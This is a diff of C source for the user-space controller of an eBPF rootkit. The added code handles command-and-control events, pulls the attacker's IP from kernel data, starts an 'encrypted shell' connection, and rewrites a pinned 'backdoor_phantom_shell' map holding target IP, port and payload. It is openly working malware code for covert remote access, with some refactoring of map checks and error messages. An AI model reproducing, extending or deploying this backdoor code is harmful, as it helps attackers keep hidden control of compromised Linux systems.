@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <argp.h>
 #include <stdio.h>
 #include <time.h>
@@ -5,6 +6,12 @@
 #include <sys/resource.h>
 #include <bpf/libbpf.h>
 #include <linux/if_link.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
 #include <net/if.h>
 #include <unistd.h>
 #include <locale.h>
@@ -30,10 +37,54 @@
 	}
 
 static int FD_TC_MAP;
+__u32 ifindex; //Interface to which the rootkit connects
+char* local_ip;
 
 static struct env {
 	bool verbose;
 } env;
+
+int check_map_fd_info(int map_fd, struct bpf_map_info *info, struct bpf_map_info *exp){
+	__u32 info_len = sizeof(*info);
+	int err;
+
+	if (map_fd < 0)
+		return -1;
+
+	err = bpf_obj_get_info_by_fd(map_fd, info, &info_len);
+	if (err) {
+		fprintf(stderr, "ERR: %s() can't get info - %s\n",
+			__func__,  strerror(errno));
+		return -1;
+	}
+
+	if (exp->key_size && exp->key_size != info->key_size) {
+		fprintf(stderr, "ERR: %s() "
+			"Map key size(%d) mismatch expected size(%d)\n",
+			__func__, info->key_size, exp->key_size);
+		return -1;
+	}
+	if (exp->value_size && exp->value_size != info->value_size) {
+		fprintf(stderr, "ERR: %s() "
+			"Map value size(%d) mismatch expected size(%d)\n",
+			__func__, info->value_size, exp->value_size);
+		return -1;
+	}
+	if (exp->max_entries && exp->max_entries != info->max_entries) {
+		fprintf(stderr, "ERR: %s() "
+			"Map max_entries(%d) mismatch expected size(%d)\n",
+			__func__, info->max_entries, exp->max_entries);
+		return -1;
+	}
+	if (exp->type && exp->type  != info->type) {
+		fprintf(stderr, "ERR: %s() "
+			"Map type(%d) mismatch expected type(%d)\n",
+			__func__, info->type, exp->type);
+		return -1;
+	}
+
+	return 0;
+}
 
 void print_help_dialog(const char* arg){
 	
@@ -112,11 +163,13 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 
 	}else if(e->event_type == COMMAND){
 		printf("%s COMMAND  pid:%d code:%i\n", ts, e->pid, e->code);
+		char attacker_ip[INET_ADDRSTRLEN];
 		switch(e->code){
 			case CC_PROT_COMMAND_ENCRYPTED_SHELL:
 			//TODO EXTRACT IP FROM KERNEL BUFFER
-				printf("Starting encrypted connection\n");
-				client_run("127.0.1.1", 8500);
+				inet_ntop(AF_INET, &e->client_ip, attacker_ip, INET_ADDRSTRLEN);
+				printf("Starting encrypted connection with ip: %s\n", attacker_ip);
+				client_run(local_ip, 8500);
             	break;
 			case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
 				printf("Activating all hooks as requested\n");
@@ -139,9 +192,21 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 		printf("Requested to update the phantom shell\n");
 		int key = 1;
 		struct backdoor_phantom_shell_data data;
-		int err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
+		struct bpf_map_info map_expect = {0};
+		struct bpf_map_info info = {0};
+		FD_TC_MAP = bpf_obj_get("/sys/fs/bpf/tc/globals/backdoor_phantom_shell");
+		printf("TC MAP ID: %i\n", FD_TC_MAP);
+		map_expect.key_size    = sizeof(__u64);
+		map_expect.value_size  = sizeof(struct backdoor_phantom_shell_data);
+		map_expect.max_entries = 1;
+		int err = check_map_fd_info(FD_TC_MAP, &info, &map_expect);
+		if (err) {
+			fprintf(stderr, "ERR: map via FD not compatible\n");
+			return err;
+		}
+		err = bpf_map_lookup_elem(FD_TC_MAP, &key, &data);
 		if(err<0) {
-			printf("Failed to read the shared map\n");
+			printf("Failed to read the shared map: %d\n", err);
 			return -1;
 		}
 		printf("Pre value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
@@ -173,6 +238,7 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 				free(buf);
 				printf("Post value: %i, %i, %i, %s\n", data.active, data.d_ip, data.d_port, data.payload);
 				bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
+				return 0;
 
 			}else{
 				printf("Failed to parse command\n");
@@ -185,48 +251,6 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 		bpf_map_update_elem(FD_TC_MAP, &key, &data, 0);
 	}else{
 		printf("%s COMMAND  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
-		return -1;
-	}
-
-	return 0;
-}
-
-int check_map_fd_info(int map_fd, struct bpf_map_info *info, struct bpf_map_info *exp){
-	__u32 info_len = sizeof(*info);
-	int err;
-
-	if (map_fd < 0)
-		return -1;
-
-	err = bpf_obj_get_info_by_fd(map_fd, info, &info_len);
-	if (err) {
-		fprintf(stderr, "ERR: %s() can't get info - %s\n",
-			__func__,  strerror(errno));
-		return -1;
-	}
-
-	if (exp->key_size && exp->key_size != info->key_size) {
-		fprintf(stderr, "ERR: %s() "
-			"Map key size(%d) mismatch expected size(%d)\n",
-			__func__, info->key_size, exp->key_size);
-		return -1;
-	}
-	if (exp->value_size && exp->value_size != info->value_size) {
-		fprintf(stderr, "ERR: %s() "
-			"Map value size(%d) mismatch expected size(%d)\n",
-			__func__, info->value_size, exp->value_size);
-		return -1;
-	}
-	if (exp->max_entries && exp->max_entries != info->max_entries) {
-		fprintf(stderr, "ERR: %s() "
-			"Map max_entries(%d) mismatch expected size(%d)\n",
-			__func__, info->max_entries, exp->max_entries);
-		return -1;
-	}
-	if (exp->type && exp->type  != info->type) {
-		fprintf(stderr, "ERR: %s() "
-			"Map type(%d) mismatch expected type(%d)\n",
-			__func__, info->type, exp->type);
 		return -1;
 	}
 
@@ -247,8 +271,6 @@ int main(int argc, char**argv){
 			return EXIT_FAILURE;
 		}
 	}*/
-	
-	__u32 ifindex; 
 
 	/* Parse command line arguments */
 	int opt;
@@ -261,6 +283,16 @@ int main(int argc, char**argv){
 				perror("Error on input interface");
 				exit(EXIT_FAILURE);
 			}
+			int fd = socket(AF_INET, SOCK_DGRAM, 0);
+			struct ifreq ifr;
+			//Type of address to retrieve - IPv4 IP address
+			ifr.ifr_addr.sa_family = AF_INET;
+			//Copy the interface name in the ifreq structure
+			strncpy(ifr.ifr_name , optarg , IFNAMSIZ-1);
+			ioctl(fd, SIOCGIFADDR, &ifr);
+			close(fd);
+			local_ip = inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);
+			printf("%s - %s\n" , optarg , local_ip );
 			break;
 		case 'v':
 			//Verbose output
